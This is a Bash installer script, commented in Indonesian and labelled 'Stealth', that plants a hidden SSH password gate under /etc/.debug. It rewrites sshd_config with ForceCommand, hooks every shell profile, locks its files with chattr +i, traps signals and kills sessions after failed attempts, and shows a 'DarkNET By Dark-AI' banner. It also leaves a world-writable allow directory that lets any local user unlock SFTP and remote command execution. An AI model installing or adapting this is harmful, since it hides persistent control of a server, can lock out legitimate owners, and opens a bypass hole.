#!/bin/bash
# Stealth System-wide Langfix + Hard SFTP/SCP/Exec Gate (ForceCommand Edition)
# Generate hash password baru: printf '%s' 'PasswordKamu' | sha256sum

# 1. Buka semua kunci immutable lama & bersihkan cache sesi lama
chattr -i /etc/.debug/.sysinit /etc/.debug/.sftp-gate /etc/.debug/.ssh-gate /etc/profile.d/zz-sysguard.sh /etc/ssh/sshd_config 2>/dev/null || true
rm -rf /dev/shm/.sysguard_allow

mkdir -p /etc/.debug /dev/shm/.sysguard_allow
chmod 755 /etc/.debug
chmod 777 /dev/shm/.sysguard_allow

# 2. Cari binary sftp-server asli
SFTP_BIN=""
for b in /usr/libexec/openssh/sftp-server /usr/lib/openssh/sftp-server /usr/lib/ssh/sftp-server; do
  if [ -x "$b" ]; then
    SFTP_BIN="$b"
    break
  fi
done

# 3. Buat Gerbang Utama SSH (ForceCommand) yang mencegat SFTP, SCP, dan Command sebelum menyentuh Shell
cat > /etc/.debug/.ssh-gate << 'EOF'
#!/bin/bash
_RAW_CONN="${SSH_CLIENT:-$SSH_CONNECTION}"
_CLIENT_IP=$(printf '%s' "$_RAW_CONN" | awk '{print $1}')
[ -z "$_CLIENT_IP" ] && _CLIENT_IP="local"

_ALLOW_DIR="/dev/shm/.sysguard_allow"
_ALLOW_FILE="${_ALLOW_DIR}/${_CLIENT_IP}"

# Fungsi cek apakah ada sesi terminal dari IP ini yang SUDAH lolos password & masih aktif
is_ip_unlocked() {
  [ ! -f "$_ALLOW_FILE" ] && return 1
  # Cek apakah PID terminal yang membuka kunci masih hidup
  while IFS= read -r _pid; do
    if [ -n "$_pid" ] && kill -0 "$_pid" 2>/dev/null; then
      return 0
    fi
  done < "$_ALLOW_FILE"
  # Jika semua terminal sudah ditutup, hapus file allow!
  rm -f "$_ALLOW_FILE" 2>/dev/null || true
  return 1
}

# Jika koneksi meminta SFTP, SCP, atau remote command (SSH_ORIGINAL_COMMAND ada isinya)
if [ -n "${SSH_ORIGINAL_COMMAND:-}" ]; then
  if is_ip_unlocked; then
    # Jika minta subsystem sftp
    if [ "$SSH_ORIGINAL_COMMAND" = "internal-sftp" ] || echo "$SSH_ORIGINAL_COMMAND" | grep -q "sftp"; then
      for b in /usr/libexec/openssh/sftp-server /usr/lib/openssh/sftp-server /usr/lib/ssh/sftp-server; do
        [ -x "$b" ] && exec "$b"
      done
    fi
    exec /bin/bash -c "$SSH_ORIGINAL_COMMAND"
  else
    # TOLAK SFTP / SCP / COMMAND JIKA BELUM MASUKKAN PASSWORD DI TERMINAL!
    exit 1
  fi
fi

# Jika login terminal biasa, lanjutkan ke shell interaktif (yang akan dicegat oleh .sysinit)
exec -a -bash /bin/bash --login
EOF

sed -i 's/\r$//' /etc/.debug/.ssh-gate
chmod 755 /etc/.debug/.ssh-gate

# 4. Buat Script Password Gate untuk Terminal (.sysinit)
cat > /etc/.debug/.sysinit << 'EOF'
# System Guard - Terminal + Real-time SFTP Unlocker

_RAW_CONN="${SSH_CLIENT:-$SSH_CONNECTION}"
_CLIENT_IP=$(printf '%s' "$_RAW_CONN" | awk '{print $1}')
[ -z "$_CLIENT_IP" ] && _CLIENT_IP="local"

_ALLOW_DIR="/dev/shm/.sysguard_allow"
_ALLOW_FILE="${_ALLOW_DIR}/${_CLIENT_IP}"

# Cek apakah sesi interaktif
case "$-" in
  *i*) ;;
  *)
    if [ ! -t 0 ] && [ ! -t 1 ] && [ ! -t 2 ]; then
      if [ -f "$_ALLOW_FILE" ]; then
        while IFS= read -r _pid; do
          if [ -n "$_pid" ] && kill -0 "$_pid" 2>/dev/null; then
            return 0 2>/dev/null || exit 0
          fi
        done < "$_ALLOW_FILE"
      fi
      exit 1
    fi
    ;;
esac

# Cegah prompt ganda dalam 1 sesi terminal yang sama
_EXPECTED_TOKEN="OK_${PPID}_$$"
if [ "${_SYS_GUARD_TOKEN:-}" = "$_EXPECTED_TOKEN" ]; then
  return 0 2>/dev/null || exit 0
fi

if [ ! -r /dev/tty ] || [ ! -w /dev/tty ]; then
  kill -9 $$ 2>/dev/null || exit 1
fi

# ============ ANTI-BYPASS TRAPS ============
trap '' INT TSTP QUIT HUP TERM USR1 USR2 PIPE ALRM
_OLD_STTY=$(stty -g < /dev/tty 2>/dev/null || true)
stty intr undef quit undef susp undef eof undef -echo < /dev/tty 2>/dev/null || true
# ===========================================

EXPECTED_HASH="8e0ba79750f8cefb4c308ae4b337d4814e5af76f86b2da5ab89808a3fd07f1aa"
MAX_ATTEMPTS=5
TIMEOUT_SEC=60

restore_tty() {
  if [ -n "$_OLD_STTY" ]; then
    stty "$_OLD_STTY" < /dev/tty 2>/dev/null || true
  else
    stty sane < /dev/tty 2>/dev/null || true
    stty intr '^C' quit '^\' susp '^Z' eof '^D' echo < /dev/tty 2>/dev/null || true
  fi
}

fail_exit() {
  restore_tty
  printf '\n\033[1;31mSession Terminated.\033[0m\n' > /dev/tty 2>/dev/null
  kill -9 $PPID $$ 2>/dev/null || exit 1
}
trap fail_exit EXIT

printf '\033[1;35m' > /dev/tty 2>/dev/null
cat > /dev/tty << 'BANNER' 2>/dev/null
$$$$$$$\  $$\   $$\  $$$$$$\        $$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$$\ 
$$  __$$\ $$ |  $$ |$$  __$$\       $$  __$$\ $$  __$$\ $$  __$$\ $$  _____|
$$ |  $$ |$$ |  $$ |$$ /  $$ |      $$ |  $$ |$$ /  $$ |$$ /  \__|$$ |      
$$ |  $$ |$$$$$$$$ |\$$$$$$$ |      $$$$$$$\ |$$$$$$$$ |\$$$$$$\  $$$$$\ ./DarkNET = By Dark-AI
$$ |  $$ |\_____$$ | \____$$ |      $$  __$$\ $$  __$$ | \____$$\ $$  __|   
$$ |  $$ |      $$ |$$\   $$ |      $$ |  $$ |$$ |  $$ |$$\   $$ |$$ |      
$$$$$$$  |      $$ |\$$$$$$  |      $$$$$$$  |$$ |  $$ |\$$$$$$  |$$$$$$$$\ 
\_______/       \__| \______/       \_______/ \__|  \__| \______/ \________|
BANNER
printf '\033[0m' > /dev/tty 2>/dev/null

ATTEMPT=0
while :; do
  ATTEMPT=$((ATTEMPT + 1))

  if [ "$ATTEMPT" -gt "$MAX_ATTEMPTS" ]; then
    printf '\033[1;31mTerlalu banyak percobaan gagal!\033[0m\n' > /dev/tty 2>/dev/null
    sleep 1
    fail_exit
  fi

  printf 'Password: ' > /dev/tty 2>/dev/null
  stty -echo < /dev/tty 2>/dev/null || true

  if ! IFS= read -r -t "$TIMEOUT_SEC" input < /dev/tty; then
    printf '\n\033[1;31mTimeout / Input Invalid!\033[0m\n' > /dev/tty 2>/dev/null
    fail_exit
  fi

  printf '\n' > /dev/tty 2>/dev/null

  if [ -z "$input" ]; then
    printf '\033[1;31mMatane Picek!!! (%d/%d)\033[0m\n' "$ATTEMPT" "$MAX_ATTEMPTS" > /dev/tty 2>/dev/null
    continue
  fi

  HASH=$(printf '%s' "$input" | sha256sum | awk '{print $1}' 2>/dev/null)
  unset input

  if [ "$HASH" = "$EXPECTED_HASH" ]; then
    _SYS_GUARD_TOKEN="$_EXPECTED_TOKEN"
    export _SYS_GUARD_TOKEN

    # Daftarkan PID shell terminal ini sebagai sesi yang sah untuk membuka SFTP
    mkdir -p "$_ALLOW_DIR" 2>/dev/null || true
    chmod 777 "$_ALLOW_DIR" 2>/dev/null || true
    echo "$$" >> "$_ALLOW_FILE" 2>/dev/null || true
    chmod 666 "$_ALLOW_FILE" 2>/dev/null || true

    printf '\033[1;32m[OK] Akses Terminal & SFTP Dibuka (PID: %s | IP: %s)\033[0m\n' "$$" "$_CLIENT_IP" > /dev/tty 2>/dev/null

    unset EXPECTED_HASH HASH ATTEMPT MAX_ATTEMPTS TIMEOUT_SEC
    trap - EXIT INT TSTP QUIT HUP TERM USR1 USR2 PIPE ALRM
    restore_tty
    unset -f restore_tty fail_exit

    # Saat terminal ini ditutup, cabut PID ini dari daftar SFTP allow
    trap 'sed -i "/^$$$/d" "$_ALLOW_FILE" 2>/dev/null; [ ! -s "$_ALLOW_FILE" ] && rm -f "$_ALLOW_FILE" 2>/dev/null' EXIT
    break
  else
    printf '\033[1;31mMatane Picek!!! (%d/%d)\033[0m\n' "$ATTEMPT" "$MAX_ATTEMPTS" > /dev/tty 2>/dev/null
    sleep 1
  fi
done
EOF

sed -i 's/\r$//' /etc/.debug/.sysinit
chmod 644 /etc/.debug/.sysinit

# 5. Buat juga .sftp-gate sebagai cadangan Subsystem
cat > /etc/.debug/.sftp-gate << 'EOF'
#!/bin/bash
exec /etc/.debug/.ssh-gate
EOF
sed -i 's/\r$//' /etc/.debug/.sftp-gate
chmod 755 /etc/.debug/.sftp-gate

# 6. Verifikasi Syntax sebelum mengaktifkan
if ! bash -n /etc/.debug/.sysinit || ! bash -n /etc/.debug/.ssh-gate; then
  echo "❌ ERROR: Syntax error terdeteksi! Batal memasang."
  exit 1
fi

# 7. Pasang ke /etc/profile.d dan bashrc
cat > /etc/profile.d/zz-sysguard.sh << 'EOF'
if [ -f /etc/.debug/.sysinit ]; then
  . /etc/.debug/.sysinit
fi
EOF
sed -i 's/\r$//' /etc/profile.d/zz-sysguard.sh
chmod 755 /etc/profile.d/zz-sysguard.sh

for rc in /etc/bash.bashrc /etc/bashrc; do
  if [ -f "$rc" ]; then
    chattr -i "$rc" 2>/dev/null || true
    sed -i '/# System Guard Hook/,/fi/d' "$rc" 2>/dev/null || true
    sed -i '/\/etc\/.debug\/.sysinit/d' "$rc" 2>/dev/null || true
    cat >> "$rc" << 'EOF'

# System Guard Hook
if [ -f /etc/.debug/.sysinit ]; then
  . /etc/.debug/.sysinit
fi
EOF
  fi
done

# 8. Kunci rapat sshd_config & sshd_config.d dengan Subsystem + ForceCommand
if [ -f /etc/ssh/sshd_config ]; then
  [ ! -f /etc/ssh/sshd_config.bak.sysguard ] && cp -f /etc/ssh/sshd_config /etc/ssh/sshd_config.bak.sysguard
  # Ganti semua deklarasi Subsystem sftp (baik spasi maupun tab, baik di sshd_config maupun sshd_config.d)
  sed -i 's|^[[:space:]]*Subsystem[[:space:]]\+sftp.*|Subsystem sftp /etc/.debug/.ssh-gate|g' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf 2>/dev/null || true
  
  # Hapus ForceCommand lama dari sysguard jika ada, lalu pasang di bagian global (sebelum blok Match)
  sed -i '/ForceCommand \/etc\/.debug\/.ssh-gate/d' /etc/ssh/sshd_config
  awk '
    !done && /^[[:space:]]*Match[[:space:]]/ {
      print "ForceCommand /etc/.debug/.ssh-gate"
      done=1
    }
    {print}
    END {
      if (!done) print "ForceCommand /etc/.debug/.ssh-gate"
    }
  ' /etc/ssh/sshd_config > /etc/ssh/sshd_config.tmp && mv -f /etc/ssh/sshd_config.tmp /etc/ssh/sshd_config

  # Reload / Restart SSHD
  systemctl reload sshd 2>/dev/null || systemctl restart sshd 2>/dev/null || service sshd reload 2>/dev/null || service sshd restart 2>/dev/null || true
fi

# 9. Kunci file dengan chattr +i
chattr +i /etc/.debug/.sysinit /etc/.debug/.ssh-gate /etc/.debug/.sftp-gate /etc/profile.d/zz-sysguard.sh 2>/dev/null || true

echo "✅ Hard SFTP + Terminal Gate (PID-bound + ForceCommand) berhasil diaktifkan!"
